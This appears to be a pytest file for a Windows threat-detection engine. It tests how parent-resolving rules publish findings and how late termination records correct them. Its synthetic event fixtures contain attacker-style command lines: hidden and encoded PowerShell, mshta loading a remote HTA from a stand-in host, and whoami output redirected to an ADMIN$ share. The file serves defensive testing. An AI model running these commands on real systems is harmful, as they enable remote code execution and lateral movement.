"""When parent-resolving Windows findings are published, how late records correct them, and that every citation of
every Windows finding has its raw record stored (sweep level)."""

from __future__ import annotations

from datetime import UTC, datetime, timedelta

from sqlalchemy import select

from romulus.detect.windows_common import share_windows_lineage
from romulus.detect.windows_lineage import LureAppSpawnsCodeRunner
from romulus.detect.windows_proxy import MshtaExecution
from romulus.detect.windows_remote import RemoteExecutionParent
from romulus.evidence.windows_catalog import SECURITY, SYSMON, SYSMON_CHANNEL
from romulus.sources.models import Completeness, SearchOutcome, Window
from romulus.sources.profile import contract_from_types
from romulus.store import schema as t
from tests.windows_fixtures import LogicalWindowsEvent, windows_hit
from tests.windows_process_support import run, security4688, security4689, stored, sysmon1

WINWORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD = r"C:\Windows\System32\cmd.exe"
WMI = r"C:\Windows\System32\wbem\WmiPrvSE.exe"
SVCHOST = r"C:\Windows\System32\svchost.exe"
START = datetime(2026, 1, 2, tzinfo=UTC)


def _drive(rule, batches):
    """Consume batches, returning (published during consume, published at finalize), each as the store keeps it."""
    by_id = {event.id: event for batch in batches for event in batch}
    rule.load = lambda ids: [by_id[i] for i in ids if i in by_id]
    early: list = []
    for batch in batches:
        early.extend(rule.consume(batch))
        rule.drain_staged()
        rule.drain_bounds()
    return stored(early), stored(rule.finalize())


# ---- D1: what is published immediately, what waits, and corrections ----

def test_a_sysmon_child_with_its_parent_image_is_published_before_finalize():
    child = sysmon1(image=PS, parent_image=WINWORD, command="powershell.exe -nop")
    early, final = _drive(LureAppSpawnsCodeRunner(), [[child]])
    assert [m.proposed_lane for m in early] == ["high"] and final == []


def test_a_4688_child_with_an_unambiguous_pid_parent_is_published_before_finalize():
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    child = security4688(image=PS, command="powershell.exe", pid=0x2bc, ppid=0x700, offset=5)
    early, final = _drive(LureAppSpawnsCodeRunner(), [[parent], [child]])
    assert [m.proposed_lane for m in early] == ["high"] and final == []
    assert parent.id in early[0].context_ids                       # the parent's creation record is cited


def test_a_late_termination_between_parent_and_child_corrects_the_early_match():
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    child = security4688(image=PS, command="powershell.exe", pid=0x2bc, ppid=0x700, offset=10)
    late_term = security4689(image=WINWORD, pid=0x700, offset=5)    # shipped later, but falls before the child
    early, final = _drive(LureAppSpawnsCodeRunner(), [[parent, child], [late_term]])
    assert [m.proposed_lane for m in early] == ["high"]
    [correction] = final
    # same identity as the early finding (same rule, same subject record, no group key): it revises it in place
    assert correction.group_key == "" and correction.revision_reason
    assert [e.id for e in correction.events if e.id not in correction.context_ids] == [child.id]
    assert correction.proposed_lane == "lead"                       # the parent is no longer resolved
    assert "Revised decision" in correction.claim and "withdrawn" in correction.claim
    assert "terminated" in correction.claim                         # says what changed and why
    assert late_term.id in correction.context_ids                   # cites the record that changed the answer
    # (its raw copy travels with the match inside a sweep; the sweep-level test checks it is stored)
    # what the store keeps: one candidate, the revised one
    [kept] = stored(early + final)
    assert kept is correction


def test_a_late_record_outside_the_childs_window_changes_nothing():
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    child = security4688(image=PS, command="powershell.exe", pid=0x2bc, ppid=0x700, offset=10)
    later_term = security4689(image=WINWORD, pid=0x700, offset=20)  # after the child: the parent was live
    early, final = _drive(LureAppSpawnsCodeRunner(), [[parent, child], [later_term]])
    assert [m.proposed_lane for m in early] == ["high"] and final == []


def test_a_4688_parent_process_name_is_used_directly_and_cited_from_the_child():
    # Security 4688 records the creator's image (ParentProcessName): no parent creation record is needed, the
    # predicate's parent field comes from the child itself, and a later record of the parent pid changes nothing.
    child = security4688(image=PS, command="powershell.exe -nop", pid=0x2bc, ppid=0x700, offset=10,
                         parent_name=WINWORD)
    assert child.get("process.parent.executable_key")
    late_term = security4689(image=WINWORD, pid=0x700, offset=5)
    early, final = _drive(LureAppSpawnsCodeRunner(), [[child], [late_term]])
    [match] = early
    assert match.proposed_lane == "high" and final == []
    [parent_field] = [p for p in match.predicate if p.field == "process.parent.executable_key"]
    assert ":lineage:" not in parent_field.origin                    # the child's own field, not the pid lineage
    assert [e.id for e in match.events] == [child.id]


def test_an_undecided_child_is_resolved_and_published_at_finalize():
    child = security4688(image=PS, command="powershell.exe", pid=0x2bc, ppid=0x700, offset=10)
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    # the child's target is swept before the parent's: undecided when read, decided at finalize
    early, final = _drive(LureAppSpawnsCodeRunner(), [[child], [parent]])
    assert early == []
    assert [m.proposed_lane for m in final] == ["high"]


def _children(ppid, offsets, first_pid=0x2B0):
    return [security4688(image=PS, command="powershell.exe -nop", pid=first_pid + 4 * index, ppid=ppid,
                         offset=offset) for index, offset in enumerate(offsets)]


def _fleet(matches):
    return [m for m in matches if "|fleet|" in m.group_key]


def test_withdrawn_repeats_leave_the_fleet_tally_and_a_true_recurrence_stays_at_its_lane():
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    children = _children(0x700, (10, 20, 30, 40))
    late_term = security4689(image=WINWORD, pid=0x700, offset=25)   # read later; withdraws the parent of 30 and 40
    early, final = _drive(LureAppSpawnsCodeRunner(), [[parent, *children], [late_term]])
    [so_far] = _fleet(early)
    assert "4 process-creation record(s)" in so_far.claim or "so far" in so_far.claim
    [tally] = _fleet(final)
    assert tally.group_key == so_far.group_key and tally.revision_reason
    assert tally.proposed_lane == "high"                            # a true recurrence remains (10 and 20)
    assert "in 2 process-creation record(s)" in tally.claim and "(1 of them repeats" in tally.claim
    assert "2 record(s) were excluded after later records withdrew their parent" in tally.claim
    members = [e.id for e in tally.events if e.id not in tally.context_ids]
    assert children[2].id not in members and children[3].id not in members
    assert {children[2].id, children[3].id} <= tally.context_ids     # withdrawn examples stay cited as context
    # a merged repeat had no finding of its own, so none is invented for it; its new state is counted as undecided
    assert [m for m in final if m.group_key == ""] == []


def test_a_fleet_finding_with_no_recurrence_left_is_revised_to_a_lead_saying_why():
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    children = _children(0x700, (10, 20, 30))
    late_term = security4689(image=WINWORD, pid=0x700, offset=15)
    early, final = _drive(LureAppSpawnsCodeRunner(), [[parent, *children], [late_term]])
    assert _fleet(early)
    [tally] = _fleet(final)
    assert tally.proposed_lane == "lead" and "no longer recurs" in tally.claim
    assert "2 were excluded after later records withdrew their parent" in tally.claim
    # the remaining record keeps its own finding at its own lane
    own = [m for m in stored(early + final) if m.group_key == ""]
    assert [m.proposed_lane for m in own] == ["high"]


def test_a_withdrawn_first_record_is_corrected_and_leaves_the_tally_of_its_host():
    parent_a = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    parent_b = security4688(image=WINWORD, command="winword.exe", pid=0x800, ppid=0x10, offset=1)
    first = _children(0x700, (10,))
    rest = _children(0x800, (20, 30), first_pid=0x3B0)
    late_term = security4689(image=WINWORD, pid=0x700, offset=5)
    early, final = _drive(LureAppSpawnsCodeRunner(), [[parent_a, parent_b, *first, *rest], [late_term]])
    [own] = [m for m in early if m.group_key == ""]
    corrections = [m for m in final if m.group_key == ""]
    assert [m.proposed_lane for m in corrections] == ["lead"]       # its own finding, revised in place
    assert corrections[0].events[0].id == own.events[0].id == first[0].id
    [tally] = _fleet(final)
    assert tally.proposed_lane == "high"
    assert "in 2 process-creation record(s) across 1 host(s) (1 of them repeats" in tally.claim
    assert "1 record(s) were excluded" in tally.claim


def test_twin_determinism_either_target_order_gives_identical_stored_candidates():
    # one input (the same records), replayed into fresh rules in either target order
    parent = security4688(image=WMI, command="wmiprvse.exe -Embedding", pid=0x900, ppid=0x200, offset=0)
    child = security4688(image=CMD, command="cmd.exe /c whoami", pid=0x904, ppid=0x900, offset=10)
    sysmon_child = sysmon1(image=PS, parent_image=WINWORD, command="powershell.exe -nop", offset=12, guid=77)
    security, sysmon = [parent, child], [sysmon_child]

    def candidates(order):
        rules = [LureAppSpawnsCodeRunner(), RemoteExecutionParent()]
        share_windows_lineage(rules)
        out = []
        for rule in rules:
            early, final = _drive(rule, [security, sysmon] if order == "ab" else [sysmon, security])
            out += early + final
        return sorted((m.playbook_id, m.claim, m.proposed_lane, m.group_key,
                       tuple(sorted(e.id for e in m.events))) for m in out)

    assert candidates("ab") == candidates("ba")


def test_shared_lineage_keeps_one_compact_copy_and_parent_records_only_for_cited_images():
    rules = [LureAppSpawnsCodeRunner(), RemoteExecutionParent()]
    share_windows_lineage(rules)
    lineage = rules[0].lineage
    assert all(rule.lineage is lineage for rule in rules)
    benign = [security4688(image=SVCHOST, command="svchost.exe", pid=0x100 + n, ppid=0x10, offset=n)
              for n in range(50)]
    word = security4688(image=WINWORD, command="winword.exe", pid=0x900, ppid=0x10, offset=60)
    for rule in rules:
        run(rule, benign + [word])
    # every creation is in the compact history, but a full record is kept only for an image a rule cites as a parent
    assert len(lineage.procs) == 51
    assert len(lineage.cites) == 1


# ---- D2: every citation of every Windows finding has its raw record stored (sweep level) ----

def _contract(target: str):
    return contract_from_types(
        target,
        {"@timestamp": "date", "event.dataset": "keyword", "winlog.channel": "keyword",
         "winlog.provider_name": "keyword", "winlog.event_id": "long", "winlog.computer_name": "keyword",
         "winlog.record_id": "long", "winlog.event_data": "flattened"},
        role="host", hosts=("ws01.example.test",),
    )


def _hit(channel, provider, event_id, record_id, seconds, data):
    when = (START + timedelta(seconds=seconds)).isoformat().replace("+00:00", "Z")
    return windows_hit(LogicalWindowsEvent(channel, provider, event_id, "ws01.example.test", record_id, when, data),
                       "elastic_agent")


def _4688(record_id, seconds, image, pid, ppid, command):
    return _hit("Security", SECURITY, 4688, record_id, seconds, {
        "SubjectUserSid": "S-1-5-21-1-2-3-1001", "SubjectUserName": "analyst", "SubjectDomainName": "EXAMPLE",
        "NewProcessId": hex(pid), "ProcessId": hex(ppid), "NewProcessName": image, "CommandLine": command})


def _4689(record_id, seconds, image, pid):
    return _hit("Security", SECURITY, 4689, record_id, seconds, {
        "SubjectUserSid": "S-1-5-21-1-2-3-1001", "ProcessId": hex(pid), "ProcessName": image})


def _sysmon1(record_id, seconds, image, parent, command):
    data = {"UtcTime": (START + timedelta(seconds=seconds)).strftime("%Y-%m-%d %H:%M:%S.000"),
            "ProcessGuid": f"{{00000000-0000-0000-0000-{record_id:012x}}}",
            "ParentProcessGuid": "{00000000-0000-0000-0000-000000000001}", "ProcessId": str(record_id),
            "ParentProcessId": "700", "Image": image, "ParentImage": parent, "CommandLine": command}
    return _hit(SYSMON_CHANNEL, SYSMON, 1, record_id, seconds, data)


def test_every_citation_of_every_windows_finding_has_its_raw_record_stored(tmp_path, monkeypatch):
    from romulus.hunt import sweep as sweep_module
    from romulus.hunt.sweep import Sweep
    from tests.test_sweep import _repo

    # target "sec": an immediate pid-resolved finding (parent in an earlier partition), an early finding that a later
    # termination corrects, and the child of a parent only target "late" holds (deferred to finalize).
    sec_part1 = [_4688(10, 0, WINWORD, 0x700, 0x10, "winword.exe"),
                 _4688(11, 1, WINWORD, 0x800, 0x10, "winword.exe")]
    sec_part2 = [_4688(12, 400, PS, 0x2bc, 0x700, "powershell.exe -nop"),          # immediate, parent cited
                 _4688(13, 410, CMD, 0x2c0, 0x800, "cmd.exe /c whoami"),           # early, corrected later
                 _4688(14, 420, PS, 0x2c4, 0x950, "powershell.exe -enc AA")]       # undecided now
    sysmon = [_sysmon1(20, 430, PS, WINWORD, "powershell.exe -w hidden"),          # record-resolved, immediate
              _sysmon1(21, 440, r"C:\Windows\System32\mshta.exe", r"C:\Windows\explorer.exe",
                       "mshta.exe https://e.test/a.hta")]
    late = [_4688(30, 200, WINWORD, 0x950, 0x10, "winword.exe"),                  # parent of the deferred child
            _4689(31, 405, WINWORD, 0x800)]                                         # ends 0x800 before its child
    window = Window(start=START, end=START + timedelta(minutes=10))
    first_half = Window(start=START, end=START + timedelta(minutes=5))
    second_half = Window(start=START + timedelta(minutes=5), end=START + timedelta(minutes=10))
    by_target = {("sec", first_half.key()): sec_part1, ("sec", second_half.key()): sec_part2,
                 ("sysmon", window.key()): sysmon, ("late", window.key()): late}

    def execute(_client, intent, _contract):
        records = by_target.get((intent.target, intent.window.key()), [])
        return SearchOutcome(target=intent.target, fingerprint="w", started_at=START, ended_at=START,
                             completeness=Completeness.complete, total=len(records), total_relation="eq",
                             returned=len(records), records=records)

    monkeypatch.setattr(sweep_module, "execute", execute)
    contracts = {name: _contract(name) for name in ("sec", "sysmon", "late")}
    repo = _repo()
    sweep = Sweep(repo, None, "h1", window, contracts, stage_dir=tmp_path)
    sweep.pack = [LureAppSpawnsCodeRunner(), RemoteExecutionParent(), MshtaExecution()]
    share_windows_lineage(sweep.pack)
    sweep.run_partition("sec", contracts["sec"], [], first_half, est=len(sec_part1))
    sweep.run_partition("sec", contracts["sec"], [], second_half, est=len(sec_part2))
    after_sec = {c["id"] for c in repo.candidates("h1")}
    sweep.run_partition("sysmon", contracts["sysmon"], [], window, est=len(sysmon))
    sweep.run_partition("late", contracts["late"], [], window, est=len(late))
    sweep.finalize()

    candidates = repo.candidates("h1")
    assert after_sec, "pid-resolved findings are published while the sweep reads, before finalize"
    [revised] = [c for c in candidates if "Revised decision" in c["claim"]]
    assert revised["id"] in after_sec                               # the early finding, revised in place
    assert revised["lane"] == "lead" and revised["gate_results"]["_revision"]["count"] == 1
    with repo.engine.connect() as connection:
        families = {row.family for row in connection.execute(select(t.typed_event.c.family).where(
            t.typed_event.c.id.in_(revised["event_ids"])))}
    assert "process_termination" in families                       # it cites the record that changed the answer
    # one candidate per record: the two immediate 4688 findings (one revised), the deferred one, the Sysmon lure
    # finding and the mshta finding
    assert len(candidates) == 5
    for candidate in candidates:
        with repo.engine.connect() as connection:
            rows = connection.execute(select(t.typed_event.c.id, t.typed_event.c.raw_ids).where(
                t.typed_event.c.id.in_(candidate["event_ids"]))).all()
        assert len(rows) == len(candidate["event_ids"]), candidate["claim"]
        raw_ids = [raw for row in rows for raw in (row.raw_ids or [])]
        assert raw_ids and len(repo.raw_records(raw_ids)) == len(raw_ids), candidate["claim"]
    sweep.close_stage()


# ---- the full Windows pack, finalized and released by the sweep one rule at a time ----

MMC = r"C:\Windows\System32\mmc.exe"
SERVICES = r"C:\Windows\System32\services.exe"


def _full_pack_sweep(tmp_path, monkeypatch, order):
    from romulus.detect.registry import fresh_pack
    from romulus.hunt import sweep as sweep_module
    from romulus.hunt.sweep import Sweep
    from tests.test_sweep import _repo

    # Each of the four parent-resolving rules publishes an early pid-resolved finding whose parent a termination read
    # later (target "late") withdraws; target "sec2", swept second, holds one more such child. One child's parent is
    # recorded only in "late", so every rule defers it and the remote-execution rule decides it at finalize.
    sec = [_4688(10, 0, WINWORD, 0x700, 0x10, "winword.exe"),
           _4688(11, 1, WMI, 0x800, 0x10, "wmiprvse.exe"),
           _4688(12, 2, MMC, 0x900, 0x10, "mmc.exe"),
           _4688(13, 3, SERVICES, 0xA00, 0x10, "services.exe"),
           _4688(14, 400, PS, 0x2BC, 0x700, "powershell.exe -nop"),                      # lure
           _4688(15, 410, CMD, 0x2C0, 0x800, "cmd.exe /c whoami"),                       # remote execution
           _4688(16, 420, PS, 0x2C4, 0x900, "powershell.exe -c hostname"),               # DCOM
           _4688(17, 430, CMD, 0x2C8, 0xA00,
                 r"cmd.exe /Q /c whoami 1> \\127.0.0.1\ADMIN$\__1700 2>&1"),            # service to admin share
           _4688(18, 440, CMD, 0x2CC, 0xB00, "cmd.exe /c ipconfig")]                    # parent only in "late"
    sec2 = [_4688(40, 50, WINWORD, 0xC00, 0x10, "winword.exe"),
            _4688(41, 450, PS, 0x2D0, 0xC00, "powershell.exe -w hidden")]                # lure, second target
    late = [_4688(30, 200, WMI, 0xB00, 0x10, "wmiprvse.exe"),
            _4689(31, 300, WINWORD, 0x700), _4689(32, 305, WMI, 0x800), _4689(33, 310, MMC, 0x900),
            _4689(34, 315, SERVICES, 0xA00), _4689(35, 320, WINWORD, 0xC00)]
    window = Window(start=START, end=START + timedelta(minutes=10))
    by_target = {"sec": sec, "sec2": sec2, "late": late}

    def execute(_client, intent, _contract):
        records = by_target[intent.target]
        return SearchOutcome(target=intent.target, fingerprint=intent.target, started_at=START, ended_at=START,
                             completeness=Completeness.complete, total=len(records), total_relation="eq",
                             returned=len(records), records=records)

    monkeypatch.setattr(sweep_module, "execute", execute)
    contracts = {name: _contract(name) for name in by_target}
    repo = _repo()
    sweep = Sweep(repo, None, "h1", window, contracts, stage_dir=tmp_path)
    sweep.pack = order([pb for pb in fresh_pack() if pb.id.startswith("win.")])
    released = []
    for pb in sweep.pack:
        def release(original=pb.release_state, rule_id=pb.id):
            released.append(rule_id)
            return original()

        pb.release_state = release
    for target in ("sec", "sec2", "late"):
        sweep.run_partition(target, contracts[target], [], window, est=len(by_target[target]))
    early = {c["id"] for c in repo.candidates("h1")}
    sweep.finalize()
    sweep.close_stage()
    assert sorted(released) == sorted(pb.id for pb in sweep.pack)   # the real release ran for every rule
    return early, repo.candidates("h1")


def test_full_pack_finalize_corrects_every_parent_rule_whatever_the_pack_order(tmp_path, monkeypatch):
    results = []
    orders = (list, lambda pack: list(reversed(pack)), lambda pack: pack[1::2] + pack[0::2])
    for index, order in enumerate(orders):
        early, candidates = _full_pack_sweep(tmp_path / str(index), monkeypatch, order)
        by_rule: dict[str, list] = {}
        for candidate in candidates:
            if not (candidate["gate_results"] or {}).get("_revision") or "|fleet|" in candidate["id"]:
                continue
            assert candidate["id"] in early                          # revised in place, never a second finding
            assert "Revised decision" in candidate["claim"]
            by_rule.setdefault(candidate["rule_id"], []).append(candidate)
        # a late fence corrects a finding of each of the four rules; the lure rule twice (once per target), and the
        # DCOM rule three times (Word is also a DCOM server, so both Word children are its findings too)
        assert sorted((rule, len(items)) for rule, items in by_rule.items()) == [
            ("win.dcom_activated_child", 3), ("win.lure_app_spawns_code_runner", 2),
            ("win.remote_execution_child", 1), ("win.service_child_output_to_admin_share", 1)]
        for rule in ("win.dcom_activated_child", "win.lure_app_spawns_code_runner", "win.remote_execution_child"):
            assert all(c["lane"] == "lead" for c in by_rule[rule])
        [service] = by_rule["win.service_child_output_to_admin_share"]
        assert "could not be resolved" in service["claim"] and service["lane"] == "high"
        # the deferred child of a non-first rule is decided at finalize against the whole history
        deferred = [c for c in candidates if c["id"] not in early and c["rule_id"] == "win.remote_execution_child"]
        assert len(deferred) == 1 and "ipconfig" in deferred[0]["claim"]
        results.append(sorted((c["id"], c["rule_id"], c["lane"], c["claim"]) for c in candidates))
    assert results[0] == results[1] == results[2]
